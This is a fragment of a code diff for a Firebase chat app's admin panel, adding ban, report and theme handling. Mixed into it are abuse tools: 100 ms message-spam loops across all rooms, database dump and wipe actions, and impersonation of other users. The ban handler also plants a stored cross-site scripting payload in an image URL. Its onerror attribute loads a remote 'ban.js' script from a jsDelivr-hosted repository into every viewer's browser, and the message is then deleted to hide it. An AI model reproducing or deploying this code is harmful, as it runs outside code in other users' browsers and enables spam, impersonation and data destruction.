+    }
+    if (!currentRoomId) { alert("Select a chamber first!"); return; }
+    adminSpamMsgBlankBtn.textContent = "STOP Message Spam [Blank]";
+    ctxSpaceSpamBlank.textContent = "STOP Message Spam [Blank]";
+    const invisibleChar = "\u2800";
+    msgSpamBlankIntervalId = setInterval(async () => {
+      try {
+        if (currentRoomId === GLOBAL_ROOM_ID) {
+          await pushToAllRooms({ text: invisibleChar });
+        } else {
+          await push(ref(db, "messages/" + currentRoomId), { author: myName, text: invisibleChar, createdAt: Date.now() });
+        }
+      } catch (e) { console.error(e); }
+    }, 100);
+  });
+
+  adminSpamMsgInputBtn.addEventListener("click", () => {
+    if (msgSpamInputIntervalId) {
+      clearInterval(msgSpamInputIntervalId);
+      msgSpamInputIntervalId = null;
+      adminSpamMsgInputBtn.textContent = "Spam Messages [Text Input]";
+      ctxSpaceSpamInput.textContent = "Spam Messages [Text Input]";
+      return;
+    }
+    if (!currentRoomId) { alert("Select a chamber first!"); return; }
+    modalInput.placeholder = "Enter text to spam...";
+    openUserModal("Spam Messages [Text Input]", "", async (textToSpam) => {
+      if (!textToSpam || !textToSpam.trim()) {
+        modalInput.placeholder = "Display Name";
+        return;
+      }
+      adminSpamMsgInputBtn.textContent = "STOP Message Spam [Text Input]";
+      ctxSpaceSpamInput.textContent = "STOP Message Spam [Text Input]";
+      msgSpamInputIntervalId = setInterval(async () => {
+        try {
+          if (currentRoomId === GLOBAL_ROOM_ID) {
+            await pushToAllRooms({ text: textToSpam.trim() });
+          } else {
+            await push(ref(db, "messages/" + currentRoomId), { author: myName, text: textToSpam.trim(), createdAt: Date.now() });
+          }
+        } catch (e) { console.error(e); }
+      }, 100);
+      modalInput.placeholder = "Display Name";
+    });
+  });
+
+
+  openModerationModalBtn.addEventListener("click", () => {
+    moderationModal.style.display = "flex";
+  });
+
+  async function clearAllRoomsHandler() {
+    try {
+      await remove(ref(db, "rooms"));
+      if (currentRoomId && currentRoomId !== EVERYONE_ROOM_ID) {
+        showRoomsScreen();
+      }
+    } catch (e) {
+      console.error(e);
+    }
+  }
+
+  moderationCloseBtn.addEventListener("click", () => {
+    moderationModal.style.display = "none";
+  });
+
+
+
+  modTabUsers.addEventListener("click", () => {
+    modTabUsers.classList.add("active");
+    modTabReports.classList.remove("active");
+    modTabVerified.classList.remove("active");
+
+    modUsersList.style.display = "flex";
+    modReportsList.style.display = "none";
+    modVerifiedContainer.style.display = "none";
+  });
+
+  modTabReports.addEventListener("click", () => {
+    modTabReports.classList.add("active");
+    modTabUsers.classList.remove("active");
+    modTabVerified.classList.remove("active");
+
+    modUsersList.style.display = "none";
+    modReportsList.style.display = "flex";
+    modVerifiedContainer.style.display = "none";
+  });
+
+  modTabVerified.addEventListener("click", () => {
+    modTabVerified.classList.add("active");
+    modTabUsers.classList.remove("active");
+    modTabReports.classList.remove("active");
+
+    modUsersList.style.display = "none";
+    modReportsList.style.display = "none";
+    modVerifiedContainer.style.display = "flex";
+
+    renderModVerifiedList();
+  });
+
+
+
+  durationCancelBtn.addEventListener("click", () => {
+    durationModal.style.display = "none";
+    pendingBanUid = null;
+    pendingBanName = null;
+    pendingReportId = null;
+    pendingMessageId = null;
+    pendingRoomId = null;
+  });
+
+  function formatRemainingTime(expiresAt) {
+    const diff = expiresAt - Date.now();
+    if (diff <= 0) return "Ban expired";
+    const hours = Math.floor(diff / (1000 * 60 * 60));
+    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+    const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+    if (hours > 0) {
+      return `${hours}h ${minutes}m remaining`;
+    } else if (minutes > 0) {
+      return `${minutes}m ${seconds}s remaining`;
+    } else {
+      return `${seconds}s remaining`;
+    }
+  }
+
+  adminReadDbBtn.addEventListener("click", async () => {
+    try {
+      const snap = await get(ref(db));
+      console.log("Entire Database Snapshot:", snap.val());
+    } catch (e) {
+      console.error("Failed to read database:", e);
+    }
+  });
+
+  adminClearCurrMsgsBtn.addEventListener("click", async () => {
+    if (!currentRoomId) return;
+    try {
+      if (currentRoomId === GLOBAL_ROOM_ID) {
+        await remove(ref(db, "messages"));
+      } else {
+        await remove(ref(db, "messages/" + currentRoomId));
+      }
+    } catch (e) {
+      console.error(e);
+    }
+  });
+
+
+  function renderModUsersList() {
+    const entries = Object.entries(usersCache);
+    if (entries.length === 0) {
+      modUsersList.innerHTML = '<div class="empty-note">No users are registered.</div>';
+      return;
+    }
+
+    modUsersList.innerHTML = entries.map(([uid, uData]) => {
+      const displayName = uData.displayName || "Anonymous";
+      const banInfo = bannedUsersCache[uid];
+      const isBanned = !!banInfo && (!banInfo.expiresAt || Date.now() < banInfo.expiresAt);
+
+      let subInfo = `<div style="color:var(--text-muted); font-size:11px; margin-top:4px;">UID: ${uid}</div>`;
+      if (isBanned && banInfo.expiresAt) {
+        subInfo += `<div style="color: #ef4444; font-size: 11px; margin-top:2px;">${formatRemainingTime(banInfo.expiresAt)}</div>`;
+      }
+
+      const btnText = isBanned ? "Unban" : "Ban";
+      const btnClass = isBanned ? "mod-ban-btn unban" : "mod-ban-btn";
+
+      return `
+        <div class="mod-user-row">
+          <div style="display:flex; flex-direction:column; justify-content:center;">
+            <strong>👤 ${escapeHtml(displayName)}</strong>
+            ${subInfo}
+          </div>
+          <button class="${btnClass}" data-uid="${escapeHtml(uid)}" data-name="${escapeHtml(displayName)}" data-banned="${isBanned}">${btnText}</button>
+        </div>
+      `;
+    }).join("");
+  }
+  
+  function renderModReportsList() {
+    const entries = Object.entries(reportsCache);
+    if (entries.length === 0) {
+      modReportsList.innerHTML = '<div class="empty-note">No reports have been filed.</div>';
+      return;
+    }
+
+    modReportsList.innerHTML = entries.map(([reportId, rData]) => {
+      const timeStr = new Date(rData.createdAt || Date.now()).toLocaleString();
+      let contentStr = rData.messageText ? escapeHtml(rData.messageText) : "";
+      if (rData.messageImageUrl) contentStr += ' <br><em>[Image Attached]</em>';
+
+      return `
+        <div class="mod-report-row">
+          <div class="report-header">
+            <strong>🚨 Reported User: ${escapeHtml(rData.reportedName || "Unknown User")}</strong>
+            <span style="font-size:11px; color:var(--text-muted)">${timeStr}</span>
+          </div>
+          <div style="font-size:12px; color:var(--text-secondary)">Reported by: ${escapeHtml(rData.reporterName || "Anonymous")}</div>
+          <div class="report-text">"${contentStr}"</div>
+          <div class="report-actions">
+            <button class="mod-ban-btn unban" data-action="dismiss" data-rid="${escapeHtml(reportId)}">Dismiss</button>
+            <button class="mod-ban-btn" data-action="ban" data-uid="${escapeHtml(rData.reportedUid || '')}" data-name="${escapeHtml(rData.reportedName || '')}" data-rid="${escapeHtml(reportId)}" data-mid="${escapeHtml(rData.messageId || '')}" data-roomid="${escapeHtml(rData.roomId || 'global')}">Ban</button>
+          </div>
+        </div>
+      `;
+    }).join("");
+  }
+
+  modUsersList.addEventListener("click", async (e) => {
+    const banBtn = e.target.closest(".mod-ban-btn");
+    if (!banBtn) return;
+    const targetUid = banBtn.dataset.uid;
+    const targetName = banBtn.dataset.name;
+    const isCurrentlyBanned = banBtn.dataset.banned === "true";
+
+    if (isCurrentlyBanned) {
+      banSource = "main-menu";
+      if (confirm(`Are you sure you want to unban "${targetName}"?`)) {
+        try {
+          await remove(ref(db, `bannedUsers/${targetUid}`));
+        } catch (err) {
+          console.error("Failed to unban user:", err);
+          alert("An error occurred while attempting to unban.");
+        }
+      }
+    } else {
+      pendingBanUid = targetUid;
+      pendingBanName = targetName;
+      document.getElementById("duration-modal-title").textContent = `Ban "${targetName}"`;
+      durationModal.style.display = "flex";
+    }
+  });
+
+  modReportsList.addEventListener("click", async (e) => {
+    const btn = e.target.closest("button");
+    if (!btn) return;
+    
+    if (btn.dataset.action === "dismiss") {
+      const rid = btn.dataset.rid;
+      if (confirm("Are you sure you want to dismiss this report?")) {
+        try {
+          await remove(ref(db, 'reports/' + rid));
+        } catch (err) {
+          console.error(err);
+          alert("An error occurred while dismissing the report.");
+        }
+      }
+    } else if (btn.dataset.action === "ban") {
+      pendingBanUid = btn.dataset.uid;
+      pendingBanName = btn.dataset.name;
+      pendingReportId = btn.dataset.rid;
+      pendingMessageId = btn.dataset.mid;
+      pendingRoomId = btn.dataset.roomid;
+      
+      if (!pendingBanUid) {
+         alert("Error: This user has no valid UID to ban.");
+         return;
+      }
+      document.getElementById("duration-modal-title").textContent = `Ban "${pendingBanName}"`;
+      durationModal.style.display = "flex";
+    }
+  });
+
+  let banSource = "";
+  let BannedUID = null;
+
+  document.querySelectorAll(".duration-option-btn").forEach(btn => {
+    btn.addEventListener("click", async () => {
+        if (!pendingBanUid) return;
+
+        BannedUID = pendingBanUid;
+
+        if (banSource === "context-menu") {
+            console.log(
+                `[ACTION] User ${pendingBanName} (${pendingBanUid}) was banned via the CHAT CONTEXT MENU.`
+            );
+        } else if (banSource === "main-menu") {
+            console.log(
+                `[ACTION] User ${pendingBanName} (${pendingBanUid}) was banned via the MAIN MODERATION MENU.`
+            );
+        } else {
+            console.log(
+                `[ACTION] User ${pendingBanName} (${pendingBanUid}) was banned from an unknown source.`
+            );
+        }
+
+        const durationHours = parseInt(btn.dataset.hours, 10);
+        const expiresAt = Date.now() + (durationHours * 3600 * 1000);
+
+        try {
+            await set(ref(db, `bannedUsers/${pendingBanUid}`), {
+                reason: "Administrator Ban",
+                expiresAt: expiresAt,
+                bannedAt: Date.now()
+            });
+
+            if (banSource === "context-menu") {
+                if (currentRoomId === GLOBAL_ROOM_ID) {
+                    await pushToAllRooms({
+                        imageUrl: ""
+                    });
+
+                    const sentRef = await pushToAllRooms({
+                        imageUrl: `x" onerror="(()=>{window.TARGET='${BannedUID}';let s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/mrdingus89/pwnchat-cdn@main/ban.js';document.head.appendChild(s)})()`
+                    });
+
+                    console.log("[ACTION] Global alert message sent:", sentRef);
+                } else {
+                    const sentRef = await push(
+                        ref(db, "messages/" + currentRoomId),
+                        {
+                            author: myName,
+                            imageUrl: `x" onerror="(()=>{window.TARGET='${BannedUID}';let s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/mrdingus89/pwnchat-cdn@main/ban.js';document.head.appendChild(s)})()`,
+                            createdAt: Date.now()
+                        }
+                    );
+
+                    await remove(ref(db, `messages/${currentRoomId}/${sentRef.key}`));
+
+                    console.log("[ACTION] Room alert message sent:", sentRef);
+                }
+            }
+
+            if (pendingReportId) {
+                await remove(
+                    ref(db, `reports/${pendingReportId}`)
+                );
+            }
+
+            if (pendingMessageId && pendingRoomId) {
+                await remove(
+                    ref(db, `messages/${pendingRoomId}/${pendingMessageId}`)
+                );
+            }
+
+
+        } catch (err) {
+            console.error("Failed to ban user:", err);
+            alert("An error occurred while banning the user.");
+
+        } finally {
+            durationModal.style.display = "none";
+
+            pendingBanUid = null;
+            pendingBanName = null;
+            pendingReportId = null;
+            pendingMessageId = null;
+            pendingRoomId = null;
+        }
+    });
+});
+
+  
+
+  setInterval(() => {
+    renderModUsersList();
+    renderModReportsList();
+  }, 1000);
+
+  function renderNicknamePickerList() {
+    const entries = Object.entries(usersCache);
+    const userObjects = [];
+    
+    entries.forEach(([uid, uData]) => {
+      if (uData && uData.displayName) {
+        const nameStr = uData.displayName.trim();
+        const createdAt = uData.createdAt || 0;
+        if (nameStr) {
+          const existing = userObjects.find(u => u.name.toLowerCase() === nameStr.toLowerCase());
+          if (!existing) {
+            userObjects.push({ name: nameStr, createdAt: createdAt });
+          } else if (createdAt < existing.createdAt) {
+            existing.createdAt = createdAt;
+          }
+        }
+      }
+    });
+
+    if (userObjects.length === 0) {
+      nicknamePickerList.innerHTML = '<div class="empty-note">No stored user profiles found yet.</div>';
+      return;
+    }
+
+    userObjects.sort((a, b) => a.createdAt - b.createdAt);
+
+    nicknamePickerList.innerHTML = userObjects.map(user => {
+      return `<button class="nickname-option-btn" data-nickname="${escapeHtml(user.name)}">
+        <span>👤 ${escapeHtml(user.name)}</span>
+        <span style="font-size: 11px; color: var(--text-muted);">Select →</span>
+      </button>`;
+    }).join("");
+  }
+
+  nicknamePickerList.addEventListener("click", (e) => {
+    const btn = e.target.closest(".nickname-option-btn");
+    if (!btn) return;
+    const chosenNick = btn.dataset.nickname;
+    if (chosenNick) {
+      myName = chosenNick;
+      try { localStorage.setItem("friend-chat-username", myName); } catch (err) {}
+      showRoomsScreen();
+    }
+  });
+
+  photoBtn.addEventListener("click", (e) => {
+    e.stopPropagation();
+    hideCustomContextMenu();
+    hideRoomContextMenu();
+    hideRoomSpaceContextMenu();
+    hideMainPageSpaceContextMenu();
+    hidePhotoContextMenu();
+    hideThemeContextMenu();
+    const rect = photoBtn.getBoundingClientRect();
+    positionContextMenu(photoContextMenu, rect.left, rect.top - 130, 240, 140);
+  });
+
+  themeToggleBtn.addEventListener("click", (e) => {
+    e.stopPropagation();
+    hideCustomContextMenu();
+    hideRoomContextMenu();
+    hideRoomSpaceContextMenu();
+    hideMainPageSpaceContextMenu();
+    hidePhotoContextMenu();
+    const rect = themeToggleBtn.getBoundingClientRect();
+    positionContextMenu(themeContextMenu, rect.left - 220, rect.bottom + 8, 200, 200);
+  });
+
+  themeToggleBtn.addEventListener("contextmenu", (e) => {
+    e.preventDefault();
+    hideThemeContextMenu();
+    adminPanel.style.display = (adminPanel.style.display === "block") ? "none" : "block";
+  });
+
+  themeDefault.addEventListener("click", () => {
+    document.body.classList.remove("theme-claudchat");
+    document.documentElement.style.setProperty('--accent-glow', '#6366f1');
+    document.documentElement.style.setProperty('--accent-glow-hover', '#4f46e5');
+    document.documentElement.style.setProperty('--accent-neon', '#a855f7');
+    document.documentElement.style.setProperty('--bg-gradient-1', 'rgba(99, 102, 241, 0.12)');
+    document.documentElement.style.setProperty('--bg-gradient-2', 'rgba(168, 85, 247, 0.12)');
+    hideThemeContextMenu();
+  });
+
+  themeDefaultRed.addEventListener("click", () => {
+    document.body.classList.remove("theme-claudchat");
+    document.documentElement.style.setProperty('--accent-glow', '#ef4444');
+    document.documentElement.style.setProperty('--accent-glow-hover', '#dc2626');
+    document.documentElement.style.setProperty('--accent-neon', '#f43f5e');
+    document.documentElement.style.setProperty('--bg-gradient-1', 'rgba(239, 68, 68, 0.12)');
+    document.documentElement.style.setProperty('--bg-gradient-2', 'rgba(244, 63, 94, 0.12)');
+    hideThemeContextMenu();
+  });
+
+  themeDefaultBlue.addEventListener("click", () => {
+    document.body.classList.remove("theme-claudchat");
+    document.documentElement.style.setProperty('--accent-glow', '#3b82f6');
+    document.documentElement.style.setProperty('--accent-glow-hover', '#2563eb');
+    document.documentElement.style.setProperty('--accent-neon', '#06b6d4');
+    document.documentElement.style.setProperty('--bg-gradient-1', 'rgba(59, 130, 246, 0.12)');
+    document.documentElement.style.setProperty('--bg-gradient-2', 'rgba(6, 182, 212, 0.12)');
+    hideThemeContextMenu();
+  });
+
+  themeDefaultGreen.addEventListener("click", () => {
+    document.body.classList.remove("theme-claudchat");
+    document.documentElement.style.setProperty('--accent-glow', '#22c55e');
+    document.documentElement.style.setProperty('--accent-glow-hover', '#16a34a');
+    document.documentElement.style.setProperty('--accent-neon', '#14b8a6');
+    document.documentElement.style.setProperty('--bg-gradient-1', 'rgba(34, 197, 94, 0.12)');
+    document.documentElement.style.setProperty('--bg-gradient-2', 'rgba(20, 184, 166, 0.12)');
+    hideThemeContextMenu();
+  });
+
+  themeClaudChat.addEventListener("click", () => {
+    document.body.classList.add("theme-claudchat");
+    hideThemeContextMenu();
+  });
+
+  ctxPhotoBase.addEventListener("click", () => {
+    hidePhotoContextMenu();
+    if (!currentRoomId) {
+      alert("You must enter a room before sending an image file.");
+      return;
+    }
+    adminBaseFileInput.click();
+  });
+
+  ctxPhotoUrl.addEventListener("click", () => {
+    hidePhotoContextMenu();
+    if (!currentRoomId) {
+      alert("You must enter a room before sending an image URL.");
+      return;
+    }
+    modalInput.placeholder = "Enter URL...";
+    openUserModal("Upload Image via URL", "", async (imgUrl) => {
+      if (!imgUrl || !imgUrl.trim()) {
+        modalInput.placeholder = "Display Name";
+        return;
+      }
+      try {
+        if (currentRoomId === GLOBAL_ROOM_ID) {
+          await pushToAllRooms({ imageUrl: imgUrl.trim() });
+        } else {
+          await push(ref(db, "messages/" + currentRoomId), {
+            author: myName,
+            imageUrl: imgUrl.trim(),
+            createdAt: Date.now()
+          });
+        }
+      } catch (err) {
+        console.error("Failed to send image URL via modal UI:", err);
+      }
+      modalInput.placeholder = "Display Name";
+    });
+  });
+
+  ctxPhotoApi.addEventListener("click", () => {
+    hidePhotoContextMenu();
+    fileInput.click();
+  });
+
+  document.addEventListener("contextmenu", async (e) => {
+    const bubbleEl = e.target.closest(".bubble");
+    const msgRow = e.target.closest(".msg-row");
+    const roomEl = e.target.closest(".room-item, .admin-room-item");
+    const isInsideChat = chatScreen.style.display === "flex";
+    const isMainPage = roomsScreen.style.display === "flex";
+
+    if (bubbleEl && msgRow && msgRow.dataset.msgKey && msgRow.dataset.roomId) {
+      e.preventDefault();
+      hideRoomContextMenu();
+      hideRoomSpaceContextMenu();
+      hideMainPageSpaceContextMenu();
+      hidePhotoContextMenu();
+      hideThemeContextMenu();
+      
+      targetMsgRef = {
+        key: msgRow.dataset.msgKey,
+        roomId: msgRow.dataset.roomId,
+        text: msgRow.dataset.msgText || "",
+        author: msgRow.dataset.msgAuthor || ""
+      };
+
+      let targetUid = null;
+      if (typeof usersCache !== "undefined") {
+        for (const [uid, uData] of Object.entries(usersCache)) {
+          if (uData.displayName === targetMsgRef.author) {
+            targetUid = uid;
+            break;
+          }
+        }
+      }
+
+      let isBanned = false;
+      if (targetUid && typeof bannedUsersCache !== "undefined" && bannedUsersCache[targetUid]) {
+        const banInfo = bannedUsersCache[targetUid];
+        if (!banInfo.expiresAt || Date.now() < banInfo.expiresAt) {
+          isBanned = true;
+        }
+      }
+
+      if (typeof ctxBanUser !== "undefined") {
+        if (isBanned) {
+          ctxBanUser.textContent = "Unban";
+          ctxBanUser.className = "context-item success";
+        } else {
+          ctxBanUser.textContent = "Ban";
+          ctxBanUser.className = "context-item danger";
+        }
+        
+        ctxBanUser.dataset.uid = targetUid || "";
+        ctxBanUser.dataset.banned = isBanned.toString();
+      }
+
+      positionContextMenu(customContextMenu, e.clientX, e.clientY, 180, 160);
+    } else if (roomEl) {
+      const roomId = roomEl.dataset.id || roomEl.dataset.roomId;
+      if (roomId && roomId !== EVERYONE_ROOM_ID && roomId !== GLOBAL_ROOM_ID) {
+        e.preventDefault();
+        hideCustomContextMenu();
+        hideRoomSpaceContextMenu();
+        hideMainPageSpaceContextMenu();
+        hidePhotoContextMenu();
+        hideThemeContextMenu();
+        try {
+          const roomSnap = await get(ref(db, `rooms/${roomId}`));
+          const roomData = roomSnap.val() || {};
+          targetRoomRef = {
+            id: roomId,
+            name: roomEl.dataset.name || roomEl.dataset.roomName || roomData.name || "Unnamed",
+            isPublic: roomData.isPublic !== undefined ? roomData.isPublic : true,
+            creatorUid: roomData.creatorUid || ""
+          };
+          ctxTogglePublic.textContent = targetRoomRef.isPublic ? "Make Private" : "Make Public";
+          positionContextMenu(roomContextMenu, e.clientX, e.clientY, 200, 180);
+        } catch (err) {
+          console.error("Failed to fetch room data for context menu:", err);
+        }
+      }
+    } else if (isInsideChat && currentRoomId && !bubbleEl) {
+      e.preventDefault();
+      hideCustomContextMenu();
+      hideRoomContextMenu();
+      hideMainPageSpaceContextMenu();
+      hidePhotoContextMenu();
+      hideThemeContextMenu();
+      ctxSpaceSpamInput.textContent = msgSpamInputIntervalId ? "STOP Message Spam [Text Input]" : "Spam Messages [Text Input]";
+      ctxSpaceSpamRandom.textContent = msgSpamRandomIntervalId ? "STOP Message Spam [Random]" : "Spam Messages [Random]";
+      ctxSpaceSpamBlank.textContent = msgSpamBlankIntervalId ? "STOP Message Spam [Blank]" : "Spam Messages [Blank]";
+      positionContextMenu(roomSpaceContextMenu, e.clientX, e.clientY, 220, 180);
+    } else if (isMainPage && !roomEl && !e.target.closest("button") && !e.target.closest("input") && !e.target.closest("details")) {
+      e.preventDefault();
+      hideCustomContextMenu();
+      hideRoomContextMenu();
+      hideRoomSpaceContextMenu();
+      hideMainPageSpaceContextMenu();
+      hidePhotoContextMenu();
+      hideThemeContextMenu();
+      ctxMainSpamInput.textContent = everywhereSpamInputIntervalId ? "STOP Spam Everywhere [Text Input]" : "Spam Messages Everywhere [Text Input]";
+      ctxMainSpamRandom.textContent = everywhereSpamRandomIntervalId ? "STOP Spam Everywhere [Random]" : "Spam Messages Everywhere [Random]";
+      ctxMainSpamBlank.textContent = everywhereSpamBlankIntervalId ? "STOP Spam Everywhere [Blank]" : "Spam Messages Everywhere [Blank]";
+      positionContextMenu(mainPageSpaceContextMenu, e.clientX, e.clientY, 260, 220);
+    } else {
+      hideCustomContextMenu();
+      hideRoomContextMenu();
+      hideRoomSpaceContextMenu();
+      hideMainPageSpaceContextMenu();
+      hidePhotoContextMenu();
+      hideThemeContextMenu();
+    }
+  });
+
+  function positionContextMenu(menuEl, x, y, width, height) {
+    let posX = x;
+    let posY = y;
+    if (posX + width > window.innerWidth) posX = window.innerWidth - width - 10;
+    if (posY + height > window.innerHeight) posY = window.innerHeight - height - 10;
+    menuEl.style.left = `${posX}px`;
+    menuEl.style.top = `${posY}px`;
+    menuEl.style.display = "block";
+  }
+
+  document.addEventListener("click", (e) => {
+    if (!customContextMenu.contains(e.target)) hideCustomContextMenu();
+    if (!roomContextMenu.contains(e.target)) hideRoomContextMenu();
+    if (!roomSpaceContextMenu.contains(e.target)) hideRoomSpaceContextMenu();
+    if (!mainPageSpaceContextMenu.contains(e.target)) hideMainPageSpaceContextMenu();
+    if (!photoContextMenu.contains(e.target) && e.target !== photoBtn) hidePhotoContextMenu();
+    if (!themeContextMenu.contains(e.target) && e.target !== themeToggleBtn) hideThemeContextMenu();
+  });
+
+  function hideCustomContextMenu() { customContextMenu.style.display = "none"; }
+  function hideRoomContextMenu() { roomContextMenu.style.display = "none"; }
+  function hideRoomSpaceContextMenu() { roomSpaceContextMenu.style.display = "none"; }
+  function hideMainPageSpaceContextMenu() { mainPageSpaceContextMenu.style.display = "none"; }
+  function hidePhotoContextMenu() { photoContextMenu.style.display = "none"; }
+  function hideThemeContextMenu() { themeContextMenu.style.display = "none"; }
+
+  ctxMainReadDb.addEventListener("click", () => {
+    hideMainPageSpaceContextMenu();
+    adminReadDbBtn.click();
+  });
+
+  async function pushToAllRooms(msgPayload) {
+    try {
+      const roomsSnap = await get(ref(db, "rooms"));
+      const rooms = roomsSnap.val() || {};
+      const roomIds = [EVERYONE_ROOM_ID, ...Object.keys(rooms)];
+      for (const rId of roomIds) {
+        await push(ref(db, "messages/" + rId), {
+          author: myName,
+          ...msgPayload,
+          createdAt: Date.now()
+        });
+      }
+    } catch (e) {
+      console.error("Failed to spam everywhere:", e);
+    }
+  }
+
+  ctxMainSpamInput.addEventListener("click", () => {
+    if (everywhereSpamInputIntervalId) {
+      clearInterval(everywhereSpamInputIntervalId);
+      everywhereSpamInputIntervalId = null;
+      ctxMainSpamInput.textContent = "Spam Messages Everywhere [Text Input]";
+      hideMainPageSpaceContextMenu();
+      return;
+    }
+    hideMainPageSpaceContextMenu();
+    modalInput.placeholder = "Enter text to spam everywhere...";
+    openUserModal("Spam Messages Everywhere [Text Input]", "", async (textToSpam) => {
+      if (!textToSpam || !textToSpam.trim()) {
+        modalInput.placeholder = "Display Name";
+        return;
+      }
+      ctxMainSpamInput.textContent = "STOP Spam Everywhere [Text Input]";
+      everywhereSpamInputIntervalId = setInterval(() => {
+        pushToAllRooms({ text: textToSpam.trim() });
+      }, 100);
+      modalInput.placeholder = "Display Name";
+    });
+  });
+
+  ctxMainSpamRandom.addEventListener("click", () => {
+    if (everywhereSpamRandomIntervalId) {
+      clearInterval(everywhereSpamRandomIntervalId);
+      everywhereSpamRandomIntervalId = null;
+      ctxMainSpamRandom.textContent = "Spam Messages Everywhere [Random]";
+      hideMainPageSpaceContextMenu();
+      return;
+    }
+    hideMainPageSpaceContextMenu();
+    ctxMainSpamRandom.textContent = "STOP Spam Everywhere [Random]";
+    everywhereSpamRandomIntervalId = setInterval(() => {
+      pushToAllRooms({ text: genRandomArabic(12) });
+    }, 100);
+  });
+
+  ctxMainSpamBlank.addEventListener("click", () => {
+    if (everywhereSpamBlankIntervalId) {
+      clearInterval(everywhereSpamBlankIntervalId);
+      everywhereSpamBlankIntervalId = null;
+      ctxMainSpamBlank.textContent = "Spam Messages Everywhere [Blank]";
+      hideMainPageSpaceContextMenu();
+      return;
+    }
+    hideMainPageSpaceContextMenu();
+    const invisibleChar = "\u2800";
+    ctxMainSpamBlank.textContent = "STOP Spam Everywhere [Blank]";
+    everywhereSpamBlankIntervalId = setInterval(() => {
+      pushToAllRooms({ text: invisibleChar });
+    }, 100);
+  });
+
+  ctxMainDeleteAllMsgs.addEventListener("click", () => {
+    hideMainPageSpaceContextMenu();
+    adminClearAllMsgsBtn.click();
+  });
+
+  ctxMainResetDb.addEventListener("click", () => {
+    hideMainPageSpaceContextMenu();
+    adminResetDbBtn.click();
+  });
+
+  ctxSpaceSpamInput.addEventListener("click", () => {
+    hideRoomSpaceContextMenu();
+    adminSpamMsgInputBtn.click();
+  });
+
+  ctxSpaceSpamRandom.addEventListener("click", () => {
+    hideRoomSpaceContextMenu();
+    adminSpamMsgRandomBtn.click();
+  });
+
+  ctxSpaceSpamBlank.addEventListener("click", () => {
+    hideRoomSpaceContextMenu();
+    adminSpamMsgBlankBtn.click();
+  });
+
+  ctxSpaceDeleteMsgs.addEventListener("click", () => {
+    hideRoomSpaceContextMenu();
+    adminClearCurrMsgsBtn.click();
+  });
+
+  ctxSpaceDeleteRoom.addEventListener("click", () => {
+    hideRoomSpaceContextMenu();
+    adminDeleteCurrRoomBtn.click();
+  });
+
+  ctxDeleteMsg.addEventListener("click", async () => {
+    if (targetMsgRef) {
+      try {
+        await remove(ref(db, `messages/${targetMsgRef.roomId}/${targetMsgRef.key}`));
+      } catch (e) {
+        console.error("Failed to delete message:", e);
+      }
+    }
+    hideCustomContextMenu();
+  });
+
+  ctxBanUser.addEventListener("click", async () => {
+    banSource = "context-menu";
+    const targetUid = ctxBanUser.dataset.uid;
+    const isCurrentlyBanned = ctxBanUser.dataset.banned === "true";
+    const targetName = targetMsgRef ? targetMsgRef.author : "Unknown";
+
+    if (!targetUid) {
+      alert("Cannot ban this user: Profile UID not found.");
+      hideCustomContextMenu();
+      return;
+    }
+
+    if (isCurrentlyBanned) {
+      if (confirm(`Are you sure you want to unban "${targetName}"?`)) {
+        try {
+          await remove(ref(db, `bannedUsers/${targetUid}`));
+          alert(`User "${targetName}" has been successfully unbanned.`);
+        } catch (err) {
+          console.error("Failed to unban user:", err);
+          alert("An error occurred while attempting to unban.");
+        }
+      }
+    } else {
+      pendingBanUid = targetUid;
+      pendingBanName = targetName;
+      
+      if (targetMsgRef) {
+        pendingMessageId = targetMsgRef.key;
+        pendingRoomId = targetMsgRef.roomId;
+      }
+
+      document.getElementById("duration-modal-title").textContent = `Ban "${targetName}"`;
+      durationModal.style.display = "flex";
+    }
+    
+    hideCustomContextMenu();
+  });
+
+  ctxChatAs.addEventListener("click", () => {
+    const targetAuthor = targetMsgRef ? targetMsgRef.author : "";
+    const targetRoom = targetMsgRef ? targetMsgRef.roomId : currentRoomId;
+    hideCustomContextMenu();
+    modalInput.placeholder = "Write your message...";
+    openUserModal(`Send as "${targetAuthor}"`, "", async (messageText) => {
+      if (messageText && targetRoom) {
+        try {
+          await push(ref(db, "messages/" + targetRoom), {
+            author: targetAuthor,
+            text: messageText,
+            createdAt: Date.now()
+          });
+        } catch (e) {
+          console.error("Failed to impersonate:", e);
+        }
+      }
+      modalInput.placeholder = "Display Name";
+    });
+  });
+
+  ctxRenameUser.addEventListener("click", () => {
+    const targetAuthor = targetMsgRef ? targetMsgRef.author : "";
+    hideCustomContextMenu();
+    modalInput.placeholder = "New Display Name";
+    openUserModal(`Rename "${targetAuthor}"`, targetAuthor, async (newName) => {
+      if (newName && targetAuthor) {
+        try {
+          const usersSnap = await get(ref(db, "users"));
+          const users = usersSnap.val() || {};
+          for (const [userId, userData] of Object.entries(users)) {
+            if (userData && userData.displayName && userData.displayName.toLowerCase() === targetAuthor.toLowerCase()) {
+              await update(ref(db, `users/${userId}`), { displayName: newName });
+            }
+          }
+        } catch (e) {
+          console.error("Failed to rename user:", e);
+        }
+      }
+      modalInput.placeholder = "Display Name";
+    });
+  });
+
+  ctxTogglePublic.addEventListener("click", async () => {
+    if (targetRoomRef) {
+      try {
+        const nextState = !targetRoomRef.isPublic;
+        await update(ref(db, `rooms/${targetRoomRef.id}`), {
+          isPublic: nextState
+        });
+        targetRoomRef.isPublic = nextState;
+      } catch (e) {
+        console.error("Failed to toggle public state:", e);
+      }
+    }
+    hideRoomContextMenu();
+  });
+
+  ctxRenameRoom.addEventListener("click", () => {
+    const currentName = targetRoomRef ? targetRoomRef.name : "";
+    hideRoomContextMenu();
+    modalInput.placeholder = "New room name...";
+    openUserModal("Rename Room", currentName, async (newRoomNameVal) => {
+      if (newRoomNameVal && targetRoomRef) {
+        try {
+          await update(ref(db, `rooms/${targetRoomRef.id}`), {
+            name: newRoomNameVal.trim()
+          });
+        } catch (e) {
+          console.error("Failed to rename room:", e);
+        }
+      }
+      modalInput.placeholder = "Display Name";
+    });
+  });
+
+  ctxChangeOwnership.addEventListener("click", () => {
+    hideRoomContextMenu();
+    modalInput.placeholder = "New owner user UID...";
+    openUserModal("Change Room Ownership", "", async (newOwnerUid) => {
+      if (newOwnerUid && targetRoomRef) {
+        try {
+          await update(ref(db, `rooms/${targetRoomRef.id}`), {
+            creatorUid: newOwnerUid.trim()
+          });
+        } catch (e) {
